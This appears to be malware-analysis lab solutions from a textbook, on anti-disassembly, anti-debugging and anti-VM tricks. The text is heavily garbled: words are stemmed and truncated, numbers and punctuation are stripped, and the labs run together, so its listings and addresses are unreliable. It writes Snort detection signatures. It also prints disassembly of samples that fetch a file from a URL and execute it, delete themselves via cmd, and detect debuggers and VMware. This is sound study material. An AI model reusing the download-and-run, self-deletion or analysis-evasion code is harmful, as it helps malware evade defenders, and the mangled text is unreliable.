suspici string output url alway begin way consist pattern malwar command includ quit download sleep redirect quit command simpli quit program download command download run execut except unlik previou lab attack specifi url download redirect command modifi configur file use malwar new beacon url malwar inher download come import advantag webbas control abil easili adjust malici domain identifi shut distinct element malwar behavior may independ target includ follow signatur relat static defin domain path similarinform dynam discov url signatur relat static compon beacon signatur identifi initi requir command signatur identifi specif attribut command argument pair see detail analysi specif signatur detail analysi run malwar see produc follow beacon packet get starthtm http accept acceptlanguag enu uacpu x acceptencod gzip deflat userag userag mozilla compat msie window nt net clr net clr host wwwpracticalmalwareanalysiscom cachecontrol nocach begin identifi network function use malwar look import see function two librari wininet com function use includ internetopena internetopenurla internetclosehandl internetreadfil start wininet function navig function contain internetopenurla xf notic static string code lead internetopena shown exampl c exampl c static string use beacon accept nacceptlanguag enusnuacpu xnacceptencod gzip deflat userag mozilla compat msie window nt net clr net clr string agre string initi beacon first glanc appear fairli common combin element may actual rare write signatur look specif combin header get sens exactli rare combin base mani time signatur trigger take second look string exampl c compar theraw beacon packet begin analysi notic repeat userag userag beacon packet although look correct string output malwar author made mistak forgot internetopena call includ header titl oversight allow effect signatur let first identifi beacon content investig malwar process respons see network function xf take two paramet one use internetopenurla call paramet url defin beacon destin parent function winmain contain primari loop sleep call trace url paramet backward within winmain see set function x contain createfil call function x refer coupl string includ cautobatex httpwwwpracticalmalwareanalysiscomstarthtm static url end starthtm appear branch repres failur open file suggest fallback beacon url file exist examin createfil function use refer cautobatex appear readfil command take buffer argument eventu pass way back internetopenurla function thu conclud autobatex configur file store url plaintext identifi sourc compon beacon navig back origin call identifi happen content receiv follow internetreadfil call xc see anoth call strstr one paramet strstr function sit within two loop outer call contain internetreadfil call obtain data inner call contain strstr function call anoth function x call find string presum addit test whether found correct content hypothesi confirm examin intern function figur c show test input buffer use chain small connect block attack tri disguis string look break comparison mani small test elimin telltal comparison stringaddit notic requir string noscript mix order avoid produc obviou pattern first three comparison figur c n posit posit posit two larg comparison block follow singlebyt comparison first contain search charact well string comparison strstr two string pass argument backtrack clear one argument string read internet url origin came configur file search backward search within url found convert null nulltermin string essenti block search url minu filenam within return buffer figur c obfusc string comparison second block search static string start end truncat url two path bottom function one repres failur find desir characterist one representingsuccess notic larg number path focus failur state loc path repres earli termin search summari assum default url use filter function part code look follow ellipsi noscript tag repres variabl content noscript httpwwwpracticalmalwareanalysiscom returnedcont let shift focu happen return content return winmain see function x immedi follow internet function xf take similar paramet turn url decis function confirm recogn switch structur use jump tabl switch structur strtok use divid command content two part put two variabl follow disassembl pull first charact first string use switch statement bf mov ecx ebpvar c movsx edx byte ptr ecx c mov ebpvar edx c mov eax ebpvar cb sub eax case charact case greater valu translat n r n function easiest one figur sinc noth set variabl caus main loop exit function turn sleep use second part command directli number valu sleep command r function relat pass second part command function earli execut shown figur c function call urldownloadtocachefilea createprocessa look much like code lab solut url provid output share function figur c x assum sort decod function r function also use encod function take output use function x refer createfil writefil cautobatex configur file referenc earlier evid caninf intent r function redirect malwar differ beacon site overwrit configur file figur c function graph show connect r command lastli let look encod function use redirect download function alreadi know decod content use url examin decod function x notic loop lower right corner start loop call strlen impli input encod piec examin end loop see return top variabl contain output identifi presenc end function increas one sourc function increas two function take two charact time sourc turn number atoi function use number index follow string abcdefghijklmnopqrstuvwxyzwhil string look somewhat similar base string doesnt capit letter charact url adequ describ lowercas letter given understand algorithm let encod default url malwar encod shown figur c figur c exampl encod default url custom cipher see encod url start http alway string let use weve learn gener suitabl set signatur malwar overal three kind commun beacon packet command embed web page request download execut file sinc request download base entir data come attack difficult produc signatur beacon beacon packet follow structur get starthtm http accept acceptlanguag enu uacpu x acceptencod gzip deflat userag userag mozilla compat msie window nt net clr net clr host wwwpracticalmalwareanalysiscom cachecontrol nocach element ital defin url ephemer though certainli use known bold element static come two differ string code see exampl c sinc attack made mistak includ extra userag obviou signatur target specif userag string addit userag header alert tcp homenet externalnet httpport msgpm specif userag duplic header contentuseragentauseragenta mozillacompatiblemsiewindowsnt netclrnetclr httpheadersid rev web command overal pictur command provid web page follow noscript truncatedurl cmdchar arg malwar search sever static element web page includ noscript tag first charact url http trail sinc pars function read cmdchar structur differ area code may chang independ target separ thu follow signatur target static element expect malwar alert tcp externalnet httpport homenet msgpm noscript tag end contentnoscript contenthttp distanc within content distanc within sid rev section code target command process command accept malwar list tabl c tabl c malwar command name command argument download encod url quit n na redirect r encod url sleep number second download redirect function share routin decod url shown figur c target two command togeth alert tcp externalnet httpport homenet msgpm download redirect command content pcre dr sid rev signatur use string previous identifi encod represent http pcre rule option includ string forward slash r indic download redirect command escap forward slash dr repres either charact r match zero charact aforward slash anoth escap slash quit command one known charact insuffici target thu last command need target sleep detect follow signatur alert tcp externalnet httpport homenet msgpm sleep command content pcre sid rev sinc fix content express target provid suffici process perform use one element outsid command string achiev effici signatur pcre identifi forward slash follow charact forward slash forward slash digit plu trail note upper lower bound number charact match regular express driven malwar accept rather determin tradeoff reason expect attack cost associ unbound regular express malwar may inde abl accept sleep valu digit doubt attack would send valu sinc translat trillion year charact term start assum attack would continu choos singl word start though valu certainli increas foolproof signatur neededlab solut short answer program use fals condit branch xor eax eax follow jz program trick disassembl disassembl opcod xe first byte call instruct immedi follow jz instruct fals condit branch techniqu use five time program commandlin argument pdq caus program print good job detail analysi first load file ida pro scroll main function address x line start function memori address xe see first sign antidisassembl shown exampl c exampl c jz jump middl call instruct cmp dword ptr ebp jnz short loce c c xor eax eax e jz short near ptr loc loc code xrefej e b c b call near ptr bcah shown jz instruct appear jump middl byte call instruct must determin whether branch execut instruct immedi preced branch xor eax eax alway set eax regist zero thu alway result zero flag set jz instruct therefor alway jump point state zero flag alway known must alter disassembl show real target jump instead fake call instruct overlap itposit cursor line x press key keyboard turn line data shown exampl c notic code xref comment longer red green target jz instruct longer loc unk seen exampl c convert call instruct exampl c data e jz short near ptr unk e e db eh b unk db bh code xref ej modifi real target jz instruct place cursor press c key keyboard turn piec data code instruct immedi follow list may align keep press c db line follow instruct follow immedi anoth instruct data byte fals condit techniqu found offset xf clean code locat manner reveal anoth use fals condit techniqu locat x final remain place fix x xe code disassembl correctli select code line x retn instruct line x press p key keyboard forc ida pro turn block code function function renam function paramet argc argv point clear line x program check see valu argc print failur string valu line xa compar first letter argv p line xe compar third letter q x compar second three letter equal string good job print line xlab solut short answer url initi request httpwwwpracticalmalwareanalysiscombamboohtml userag string gener ad letter number hostnam z rotat program look string bamboo page request program search beyond bamboo string find addit convert null termin string bamboo termin download file name account summaryxlsex execut detail analysi open binari ida pro scroll main function offset x begin disarm function read top bottom fix countermeasur reach logic end function first countermeasur encount shown exampl c address xa exampl c fals condit test esp esp c jnz short near ptr loce e e loce code xref cj e jmp near ptr aacdh e db ah dd eah ah cbh fffefdh ffh h dd fffffdh fdbdh ffffh fcddh fffffeh list show fals condit use jnz instruct jump alway taken valu esp alway nonzero point program esp regist never load specif valu must nonzero normal function win applic target jump lie within byte jmp instruct turn instruct data put cursor press keyboardthen put cursor jump target line xf press c turn line code continu read code encount antidisassembl countermeasur line xd simpl fals condit base jz follow xor eax eax instruct correct disassembl fashion lab solut sure continu turn byte code read clearli continu read code come next countermeasur line x shown exampl c exampl c jmp loc code xref locj eb ff jmp short near ptr loc byte jmp instruct whose target second byte second byte first byte next instruct turn instruct data put cursor second byte locat x turn code forc ida pro produc clean graph turn first byte jmp instruct xeb nop use commerci version ida pro select file python command enter patchbytex x text box click ok put cursor locat x contain valu db h convert code press c key continu read code reach next countermeasur line x shown exampl c exampl c fals condit target jz short near ptr locd b jnz short near ptr locd locd code xref j bj call near ptr ffcfffh exampl c show fals condit base put halv condit branch backtoback point target target jnz jz mean countermeasur depend specif state zero flag either set unset order hit target code case target middl call instruct line xd convert instruct data press key keyboard put cursor line xe convert code c keycontinu read code reach next countermeasur line xe shown exampl c exampl c fals condit middl previou instruct e loce code xref ecj e b eb mov ax ebh ea c xor eax eax ec fa jz short near ptr loce ee e call near ptr aaddh exampl c show advanc countermeasur involv fals condit jump middl previou instruct seen upward jump jz jump middl mov instruct imposs disassembl show instruct execut case opcod use twice follow code logic convert instruct code reach finish countermeasur look like code exampl c see middl mov instruct previou list convert proper jmp instruct exampl c manual repair antidisassembl code e db h e b db bh e e e loce code xref ecj e eb jmp short locef ea ea c xor eax eax ec fa jz short loce ec ee e db eh ef ef ef locef code xref locej ef push ah convert extra db byte like one shown nop use ida python patchbyt option describ exampl c allow creat proper function within ida pro creat function patch nop select code retn instruct line xe begin function x press p key view result function graphic press spacebar two function subf sub immedi follow mainfunct build string stack duplic heap strdup return pointer heap string malwar author craft function build string show plaintext string binari appear memori runtim first two function produc string httpwwwpracticalmalwareanalysiscombamboohtml second produc string account summaryxlsex defeat antidisassembl countermeasur main function function show crossrefer call main function renam function buildurl buildfilenam put cursor function name press n key keyboard exampl c show call buildurl renam function exampl c open httpwwwpracticalmalwareanalysiscombamboohtml url f push push push push c call buildurl push eax mov edx ebpvar push edx call dsinternetopenurla read code see attempt open bamboohtml url return buildurl use internetopenurla order determin userag string use malwar call internetopenurla function need first find internetopen function call determin data pass earlier function see internetopena call shown exampl c exampl c set connect via internetopena f push push push push lea ecx ebpnam push ecx e call dsinternetopena first argument internetopena userag string ecx push argument lea instruct load pointer aloc stack ida pro stack frame analysi name locat name seen must scroll function see name get popul near begin function shown exampl c see refer name locat exampl c use gethostnam get local machin name push h namelen c lea eax ebpnam push eax name call dsgethostnam gethostnam function popul buffer hostnam local machin base exampl c might tempt conclud userag string hostnam would partial correct fact care examin code locat x xf shown reveal loop respons modifi letter number within hostnam increment one use userag letter number end z reset follow call internetopena first call internetopenurla data html web page download local buffer call internetreadfil shown exampl c buffer contain data second argument name automat ida pro str line function see str buffer access exampl c read pars download html f push eax push ffffh lea ecx ebpstr b push ecx c mov edx ebpvarc push edx call dsinternetreadfil push offset substr bamboo da lea ecx ebpstr e push ecx str e call dsstrstr strstr function use find substr within larger string case find string bamboo within buffer str contain data retriev initi url code immedi follow thestrstr call shown exampl c exampl c pars string separ bamboo e add esp ea mov ebpvar eax f cmp ebpvar f jz loc fd push offset ascc mov edx ebpvar push edx str call dsstrstr f add esp mov byte ptr eax mov eax ebpvar add eax e mov ebpvar eax see pointer string bamboo found within download html store var second call strstr seen call search next two colon found code replac first colon null design termin string contain bamboo pointer store var increment eight happen exact string length bamboo pointer referenc oper pointer refer whatev follow colon sinc code alreadi found trail colon substitut null proper nulltermin string whatev bamboo store var immedi follow stringpars code see var use exampl c exampl c open anoth url order download malwar push push b push push f mov ecx ebpvar push ecx mov edx ebpvar c push edx call dsinternetopenurla second argument var internetopenurla url open therefor data bamboo trail colon intend tobe url program download analysi code line xe xe shown reveal url open exampl c download file account summaryxlsex launch call shellexecut line xlab solut short answer malici code initi call overwrit return pointer main function malici code download file url launch winexec url use program httpwwwpracticalmalwareanalysiscomtthtml filenam use program spoolsrvex detail analysi quickli examin binari initi seem processlist tool might also notic suspici import urldownloadtofil winexec scroll near bottom code ida pro c runtim librari code may even notic suspici function call code seem part program refer much isnt even disassembl scroll top main function examin line disassembl shown exampl c exampl c calcul address load stack c mov eax h eax ch mov ebp eax code build valu xc ore x xc togeth store eax code load valu locat stack rel ebp press ctrl k bring stack frame view current function see offset point return address overwrit return address main function end orphan code xc execut instead normal processtermin code c runtim librari start code xc identifi ida pro part ofa function shown exampl c exampl c orphan code assembl xc c push ebp mov ebp esp f push ebx push esi push edi xor eax eax jz short near ptr loc loc code xref j jmp near ptr dh orphan code begin normal function encount anti disassembl countermeasur form fals condit jz instruct alway jump target jump x current shown disassembl second byte byte jmp instruct shown place cursor jmp instruct press key turn data place cursor line x press c turn code x disassembl correctli next block code see shown exampl c exampl c build except handler trigger except push offset dwordc c push larg dword ptr fs mov larg fs esp aa xor ecx ecx ac div ecx ae push offset aformoreinforma inform b call printf line place sole pose decoy never execut first five line fragment build except handler trigger dividebyzero except ecx alway zero xor ecxecx previou instruct locat handl except xc shown exampl c exampl c exceptionhandl code current defin data c dwordc dd bh ah bh abh c data xref loco dd ebch ecffh ida pro recogn data exampl c code choseninstead repres seri dword place cursor first dword press c key chang code success chang data exampl c code display shown exampl c exampl c properli disassembl exceptionhandl code c mov esp esp c mov eax larg fs ca mov eax eax cc mov eax eax ce mov larg fs eax add esp jmp short near ptr locd code exampl c unlink structur except handler remov except record stack last line code antidisassembl countermeasur form inwardpoint jmp instruct convert jmp data place cursor xd press key select line xd convert code c key correct antidisassembl countermeasur shown exampl c see rest code properli disassembl call urldownloadtofilea seen exampl c exampl c download file url e push offset unk eb call sub f add esp f push offset unk f call sub fd add esp push push push offset unk push offset unk e push call urldownloadtofilea second third argument urldownloadtofilea url filenam respect seem global memori locat unk unk use respect examin memori ida pro data appear ascii text locat also pass sub examin function see decod data care analysi function shown find ittak pointer buffer modifi place xore byte valu xff xor data unk get string httpwwwpracticalmalwareanalysiscomtthtml spoolsrvex unk immedi follow call urldownloadtofilea encount one last antidisassembl countermeasur shown exampl c fals condit form combin jz jnz togeth creat uncondit jump exampl c final antidisassembl techniqu encount malwar jz short near ptr loc jnz short near ptr loc loc code xref j j call near ptr ah e xor eax al call dswinexec target jump xa place cursor line x press turn line data select line xa press c turn code continu process left code shown exampl c exampl c use winexec launch download file push c push offset unk call dswinexec push call dsexitprocess call winexec launch whatev specifi buffer unk contain valu spoolsrvex program termin manual exitprocess lab solut short answer malwar check statu beingdebug processheap ntglobalflag flag determin run debugg malwar antidebug techniqu succeed termin remov disk manual chang jump flag ollydbg runtim get tediou sinc malwar check memori structur frequent instead modifi structur malwar check memori either manual use ollydbg plugin like phantom immun debugg immdbg pycommand hidedebug see detail analysi stepbystep way dump modifi structur ollydbg ollydbg plugin phantom immdbg pycommand hidedebug thwart malwar check detail analysi note lab descript malwar labex except antidebug techniqu therefor good place start either work lab solut review answer load malwar ollydbg see attempt delet suspect someth must wrong malwar significantli differ lab solut load labex ida pro shown figur c notic begin main method appear suspici sever access fs call function ida pro identifi one doesnt return fact function recogn ida pro suspici start none function lab solut codefigur c antidebug check contain begin function lab solut see figur c sub call code stop line leav box sinc line doesnt leav box mean function probabl termin program doesnt contain ret instruct larg box figur c contain check decid whether sub call malwar continu execut normal well analyz check look sub function sub suspici execut wont return examin exampl c show final instruct exampl c function sub code termin malwar remov disk ce lea eax ebpparamet push eax lpparamet push offset file cmdex da push lpoper dc push hwnd de call dsshellexecutea e push code e call exit function sub end call exit termin malwar call shellexecutea remov malwar disk launch cmdex use paramet c del labex check crossrefer sub find come antidebug code shown figur c let dissect figur c detail beingdebug flag exampl c show code top box figur c exampl c check beingdebug flag mov eax larg fsh mov bl eax mov ebpvar bl movsx eax ebpvar test eax eax c jz short loc e call sub see peb structur load eax use fs locat discuss manual check structur second byte access move bl regist code decid whether call sub termin remov function continu run malwar beingdebug flag offset peb structur set process run insid debugg need flag set order malwar run normal within debugg set byte either manual ollydbg plugin let manual first ollydbg make sure command line plugin instal discuss chapter launch plugin load malwar ollydbg select plugin command line commandlin window enter follow command dump fs command dump beingdebug flag dump window manual clear beingdebug flag run dump command command line window shown top part figur c rightclick beingdebug flag select binari fill shown bottomport figur c set flag chang beingdebug check perform sever time start function malwar longer call sub function let tri plugin approach ollydbg plugin phantom httpwwwwoodmanncomcollaborativetoolsindexphpphantom protect mani antidebug check use malwar download plugin instal copi ollydbg instal directori launch ollydbg select plugin phantom option open phantom option dialog shown figur c check first option hide peb set beingdebug flag next time ollydbg load malwar confirm dump peb structur plugin instal figur c use command line dump beingdebug flag set figur c ollydbg phantom plugin option processheap flag exampl c show code middl box figur c exampl c check processheap flag mov eax larg fsh b mov eax eaxh db eh e b mov eax eaxh f mov ebpvar eax f cmp ebpvar jz short locb e fb ff ff call sub peb structur load eax use fs processheap structur offset x peb move eax forceflag field offset x processheap structur move eax forceflag compar decid whether call sub continu run normal erron db eh instruct ad ida pro display opcod exampl c show xe includ next instruct look disassembl ollydbg wont see errornot encount erron db instruct ignor display opcod confirm byte disassembl properli instruct byte forceflag field nonzero processheap structur creat debugg forceflag field must order malwar run normal within debugg need chang debug either manual ollydbg command line plugin use ollydbg phantom plugin beingdebug flag set forceflag field manual launch command line plugin select plugin command line enter follow command window dump dsf x x command dump forceflag field processheap structur dump window select byte forceflag field rightclick select binari fill set byte note window offset x longer forceflag field antidebug method may end fals indic presenc debugg newer version window postxp altern use phantom plugin protect processheap anti debug techniqu phantom plugin caus techniqu fail start program debug heap creation disabl dont need modifi set beingdebug flag note windbg start program debug heap disabl use hd option caus forceflag field alway exampl command windbg hd labex creat heap normal mode rather debug mode ntglobalflag flag code lower box figur c shown exampl c exampl c check ntglobalflag flag mov eax larg fsh db eh mov eax eaxh e sub eax h mov ebpvar eax cmp ebpvar ae jnz short locb b call sub peb structur load eax use fs ntglobalflag access move eax ntglobalflag compar x decis made whether call sub termin remov function continu execut normal erron db eh ad ida pro seen ignor ntglobalflag flag offset x peb structur set x process run debugg flag weve discuss need set byte either manual use ollydbg plugin set ntglobalflag manual launch command line plugin select plugin command line enter follow command window dump fs x dump ntglobalflag flag dump window beingdebug flag select byte rightclick select binari fill set byte use also ollydbg plugin phantom protect ntglobalflag antidebug techniqu without need modifi set summari lab solut use three differ antidebug techniqu attempt thwart debugg analysi malwar manual check structur telltal sign debugg usag perform three check start nearli everi subroutin make flip singl jump flag tediou insid debugg youv seen easiest way defeat malwar chang structur memori check fail make chang either manual phantom plugin ollydbglab solut short answer run labex command line print usag string ask fourcharact password input incorrect password program respond incorrect password tri correct commandlin password byrr strncmp function call xa program immedi termin load ollydbg use default set program contain tl section tl callback start x findwindowa function use termin malwar look window class name ollydbg termin program found chang window class name use ollydbg plugin like phantom nopout call exit xc first password appear bzqr set breakpoint strncmp call password found debugg doesnt work command line result outputdebugstringa beingdebug flag use input decod algorithm use phantom plugin ensur beingdebug flag nopout add instruct x detail analysi first run program command line see follow print screen usag labex charact password program expect fourcharact password next attempt provideth password abcd command line get follow output incorrect password tri look string comparison code run program debugg set breakpoint string comparison order see password fourth lab solut question hint strncmp use load program ida pro see strncmp main function xa let load program ollydbg set breakpoint xa load labex ollydbg immedi termin without paus program suspect someth amiss check pe file structur figur c show pe header section name peview figur c peview display tl section lab solut tl section contain callback function gain execut prematur termin program ollydbg ida pro press ctrl e see locat entri point program shown figur c figur c peview display tl section lab solut doubleclick tl callback function x navig directli function see antidebug function exampl c show tl callback code exampl c findwindowa check system residu ollydbg cmp ebparg jnz short loc push lpwindownam b push offset classnam ollydbg call dsfindwindowa test eax eax jz short loc push int c call exit tl callback start comparison arg determin whether tl callback call result process start tl callback function call differ time system word anti debug techniqu execut program startup callback call findwindowa function class name ollydbg call make easi malwar see ollydbg run default window name findwindowa find window return nonzero valu caus exit function termin program disabl techniqu nopout call exit use phantom plugin ollydbg discuss previou lab figur c display option phantom plugin your use phantom plugin check load driver hide ollydbg window box protect techniqu load program ollydbg set breakpoint strncmp call xa add commandlin argument abcd ollydbg clickingth play button click play strncmp function appear compar abcd bzqrpss howev strncmp check first byte bzqrpss string conclud password must bzqr tri password command line outsid debugg receiv incorrect password error messag dig deeper code determin someth els go begin properli label encod string list second paramet pass stack strncmp byte global variabl know byte array size chang byte array renam encodedpassword next see createthread call call strncmp main function look code thread creat call doubleclick paramet label startaddress function appear decod routin sinc contain mani logic shift oper encodedpassword examin decod routin close see beingdebug flag access shown exampl c exampl c decod routin incorpor antidebug decod ror encodedpassword b mov ebx larg fsh xor encodedpassword ch rol encodedpassword xor encodedpassword h b mov bl ebx e rol encodedpassword add encodedpassword bl peb structur load ebx beingdebug flag move bl bl use modifi password easiest way prevent program use techniqu ensur beingdebug flag set either manual phantom plugin ollydbg discuss previou lab load program ollydbg break strncmp call xa time password appear bzrr tri password command line receiv incorrect password error messag againreturn decod routin see use global variabl bytea shown exampl c exampl c global bytea use password decod b mov bl bytea al rol encodedpassword add encodedpassword bl bytea move bl bl use decod code seen doubleclick bytea see initi crossrefer sub function shown exampl c exampl c outputdebugstringa antidebug techniqu mov ebpdwerrcod h b mov eax ebpdwerrcod e push eax dwerrcod f call dssetlasterror push offset outputstr b call dsoutputdebugstringa call dsgetlasterror cmp eax ebpdwerrcod jnz short loca b mov cl bytea add cl mov bytea cl outputdebugstringa call send string case b debugg display debugg attach error code set setlasterror set error code x function check see error still present comparison error code chang program run outsid debugg therefor comparison set zero flag error code chang run debugg check success code increment bytea easiest way defeat techniqu nopout add instruct next want track function exampl c sub call check crossrefer see sub call tl callback shown exampl c bold exampl c check call within tl callback cmp ebparg jnz short locc call subth code exampl c start compar arg number recal earlier discuss arg tl callback use determin tl callback made use process start thread start process termin therefor tl callback call createthread execut caus outputdebugstringa execut get correct password final get password start ollydbg phantom plugin instal set protect us beingdebug flag check findwindow check load program ollydbg nopout add instruct x set breakpoint strncmp call xa time password appear byrr tri command line get follow messag enter correct passwordlab solut short answer arent mani use string malwar import function string cmd cmdex run malwar appear noth termin must renam malwar peoex run properli malwar use three differ antidebug time techniqu rdtsc gettickcount queryperformancecount queryperformancecount check success malwar modifi string need program run properli gettickcount check success malwar caus unhandl except crash program rdtsc check success malwar attempt delet disk antidebug time check success malwar caus catch except handl manipul structur except handl seh mechan includ except handler two call time check function except handl much slowli debugg outsid debugg malwar use domain name adgmalwareanalysisbookcom detail analysi note lab descript malwar labex except ad antidebug techniqu good place start lab solut review answer refresh memori malwar capabl static analysi labex show similar labex string visibl cmdex load labex ida pro see much function present malwar exampl c show malwar use gethostbynam resolv domain use port lab solut exampl c call lab solut resolv domain name get port network byte order db call dsgethostbynam push hostshort call dshton sinc malwar use dn connect port set dynam environ use apatedn netcat howev first run malwar doesnt perform dn connect port recal lab solut name malwar need oclex let see case two string appear creat stack start malwar main function qbzwsxedc oclex renam malwar oclex see connect doesnt mean name oclex must modifi comparison exampl c show string comparison check see launch malwar correct name exampl c use strncmp modul name comparison mov ecx ebpstr push ecx str lea edx ebpstr push edx str call strncmp see str contain current name launch malwar see str look back code seem str oclex string pass sube comparison let load malwar ollydbg set breakpoint strncmp call x set breakpoint click play get divisionbyzero except caught ollydbg press shift f pass except program chang option pass except program pass except program handl arriv x breakpoint see qgrex stack compar labex tri renam malwar qgrex howev tri run name qgrex malwar still doesnt perform dn queryor connect queryperformancecount function need review sube function oclex string pass strncmp function examin sube see call queryperformancecount twice shown exampl c bold exampl c antidebug time check use queryperformancecount lea eax ebpperformancecount c push eax lpperformancecount call ds queryperformancecount lea ecx ebpvar push ecx lpperformancecount call ds queryperformancecount mov edx ebpvar sub edx dword ptr ebpperformancecount mov ebpvar edx cmp ebpvar bh jle short locc mov ebpvar two call queryperformancecount surround code examin shortli well look rest function malwar subtract firsttim captur lpperformancecount secondtim captur var next malwar compar result time differ xb decim time differ exce var set otherwis stay initi valu immedi follow check start loop xc loop shown manipul string pass function arg use var therefor queryperformancecount check influenc string result string use strncmp differ debugg versu run normal get correct string well make sure var set loop enter set breakpoint strncmp nopout instruct see filenam must peoex order malwar run properli outsid debugg let examin code surround two call queryperformancecount exampl c show code start call pop combin get current eip eax regist exampl c malwar set except handler trigger anexcept call pop eax xor ecx ecx b mov edi eax xor ebx ebx f add ebx ch add eax ebx push eax push larg dword ptr fs c mov larg fs esp div ecx sub edi dah b mov ecx ch jmp short loc repn stosb mov ecx espch add dword ptr ecxbh f xor eax eax retn pop larg dword ptr fs pop eax malwar get current eip eax add xc caus eax regist contain xc x x refer code start next malwar modifi seh insert x address seh call chain explain chapter manipul happen div ecx instruct execut caus dividebyzero except occur ecx set earlier code turn caus malwar except handler execut next two instruct process dividebyzero except return execut divis zero execut eventu lead seh chain restor remov malwar except handler malwar goe troubl execut code drastic time differ insid debugg versu outsid debugg explain chapter except handl differ run debugg take littl bit longer process small time delta enough malwar determin execut debugg gettickcount function next set breakpoint gethostbynam xdb order see domain name use malwar see malwar termin without hit breakpoint examin code main function seetwo call gettickcount shown exampl c bold exampl c antidebug time check use gettickcount call ds gettickcount mov ebpvarb eax call sub call ds gettickcount b mov ebpvarbc eax mov ecx ebpvarbc sub ecx ebpvarb ad cmp ecx b jbe short locb b xor eax eax b mov eax edx b retn two call gettickcount call sub contain seh manipul code saw queryperformancecount method analyz previous next malwar compar result time differ millisecond time differ exce one millisecond code execut instruct illeg eax set previou instruct caus malwar crash fix need make sure jump taken rdtsc instruct examin decod method sub see code lab solut differ decod method lab solut lab solut find rdtsc instruct use twice familiar seh manipul code rdtsc instruct shown exampl c bold omit seh manipul code list exampl c antidebug time check use rdtsc rdtsc push eax rdtsc f sub eax esphvar mov ebpvar eax pop eax pop eax cmp ebpvar ah e jbe short loc call sube malwar push result rdtsc instruct onto stack later execut rdtsc instruct time subtract valu itprevi push onto stack result eax ida pro mislabel first result local variabl var correct rightclick var chang instruct appear sub eax esp next time differ store var compar xa decim time differ exce sube call sube function attempt delet malwar disk fail sinc run insid debugg nevertheless malwar termin call exit end function summari lab solut use three differ antidebug techniqu thwart analysi malwar insid debugg queryperformancecount gettickcount rdtsc easiest way beat malwar game nopout jump forc taken chang condit noncondit jump figur renam malwar peoex debugg exit debugg renam file effect use basic dynam analysi techniqueslab solut short answer malwar use vulner x instruct determin run vm script find three potenti antivm instruct highlight red sidt str sldt malwar delet either sidt str detect vmware sldt instruct detect malwar malwar exit without creat main thread creat malici servic malservic machin run vmware workstat intel core none techniqu succeed result vari depend hardwar softwar use see detail analysi explan techniqu didnt work nopout sidt str instruct flip jump flag live debug malwar detail analysi malwar labex except ad antivm techniqu good place begin analysi lab solut scan malwar new function find two sub selfdelet method sub appear call sldt instruct run lab exe vm see happen differ lab solut dynam analysi result vari system system might ident lab solut machin search vulner instruct automat search vulner x instruct use ida pro python script capabl avail commerci version creat script use exampl chapter use script name findantivmpi provid lab run script ida pro select file script file andopen findantivmpi see follow ida pro output window number potenti antivm instruct output indic script detect three vulner instruct type scroll disassembl window ida pro see three instruct highlight red sidt str sldt dont commerci version ida pro search instruct use search text well analyz vulner instruct focus happen vm techniqu succe defeat doesnt work machin sidt instructionr pill sidt instruct also known red pill first vulner instruct encount malwar shown exampl c instruct store signific byte sidt result var later use code exampl c red pill use lab solut b sidt fword ptr ebpvar bc mov eax dword ptr ebpvar c mov ebpvar eax malwar check vm instruct later binari see exampl c exampl c comparison condit jump check use sidt instruct dd mov ecx ebpvar e shr ecx h e cmp ecx ffh ec jz locf signific byte sidt result var shift sinc sixth byte sidt fourth byte var contain start base memori address fifth byte compar xff vmware signatur jump taken malwar detect virtual environ call function x termin remov disk check fail test environ probabl multiprocessor machin set breakpoint xec see ecxisnt xff signatur vmware red pill effect environ nopout sidt instruct forc jz jump debugg str instruct str instruct second vulner instruct malwar seen line x str word ptr ebpvar str instruct load task state segment tss byte local variabl var malwar doesnt use local variabl call getmodulefilenam str instruct succe malwar creat malservic servic exampl c show check first byte must equal x order match signatur vmware exampl c check result str instruct mov edx ebpvar f edx ffh test edx edx jnz short loce mov eax ebpvar f eax ffh cmp eax h jnz short loce jmp loc check fail environ set breakpoint xf saw var contain x x signatur vmware str instruct check succe environ nopout str instruct forc jnz x jump debugg runtim sldt instructionno pill sldt instruct also known pill final antivm techniqu use malwar techniqu found function label sub ida pro exampl c show sldt usag within sub exampl c setup execut sldt instruct mov eax dword xddccbbaa e mov ebpvar eax sldt word ptr ebpvar mov edx ebpvar mov ebpvarc edx b mov eax ebpvarc see var set eax eax set dword previou instruct dword contain initi constant xddccbbaa result sldt instruct store var ultim move eax function return result compar see loword bit initi constant set zero shown exampl c low order byte zero jump taken malwar termin without creat thread exampl c check result sldt instruct execut call sub cmp eax ddcch db jnz short locb check fail environ set breakpoint xd found eax equal xddcc meant check vm fail pill effect environ need nopout three instruct exampl c forc jnz jump debuggerlab solut short answer export installrt installsa installsb pslist servicemain startex uninstallrt uninstallsa uninstallsb dll delet system use bat file bat file contain selfdelet code creat well file name xinstalllog contain string found virtual machin instal cancel malwar queri vmware backdoor io commun port use magic valu vx action xa use x instruct get malwar instal patch instruct xdb runtim perman disabl vm check use hex editor modifi static string binari dvm dvm altern nopout check ollydbg write chang disk installrt perform instal via dll inject option paramet contain process inject installsa perform instal via servic instal installsb perform instal via servic instal dll inject servic overwrit still run detail analysi lab solut extens piec malwar goal lab demonstr antivm techniqu slow effort analyz malwar well focu discuss disabl understand antivm aspect malwar leav task fulli revers malwar sampl begin load malwar peview examin export import malwar extens import list suggest wide rang function includ function manipul registri regsetvalueex manipul servic changeservic screen captur bitblt process list createtoolhelpsnapshot process inject createremotethread network function wsdll also see set export function mostli relat instal remov malwar shown installrt installsa installsb pslist servicemain startex uninstallrt uninstallsa uninstallsb servicemain function export list tell us malwar probabl run servic name instal export end string sa sb may method relat servic instal attempt run malwar monitor use dynam analysi techniqu use procmon set filter rundllex sinc use run malwar command line run follow command line within vm rundllex labdllinstallrt immedi notic malwar delet system file xinstalllog left behind file contain string found virtual machin instal cancel mean antivm techniqu binari note sometim encount log capabl real malwar log error help malwar author determin need chang order attack succeed also log result variou system configur encount vm attack identifi issu may encount attack check procmon output see malwar creat file vmselfdelbat malwar delet load malwar ida pro follow crossrefer back vmselfdelbat string reach sub show selfdelet script code written bat file next focu determin malwar delet use findantivmpi script previou lab work backward code examin crossrefer sub vmselfdelbat creation method let examin crossrefer shown figur c figur c crossrefer sub see figur c three crossrefer function locat differ export malwar follow crossrefer installrt see code shown exampl c installrt export function exampl c antivm check insid installrt push offset unkef char call sub da mov espvar offset afoundvirtualma found virtual machin call sub pop ecx call sub dc jmp short locda call vmselfdelbat function see refer string found earlier xinstalllog shown bold examin function see open xinstalllog log found vir tual machin instal cancel file examin code section shown exampl c graph mode see two code path condit jump call sub sub function sub empti know sub must contain antivm techniqu exampl c show subset instruct sub exampl c queri io commun port c mov eax dh vmxh cc mov ebx mov ecx ah mov edx h 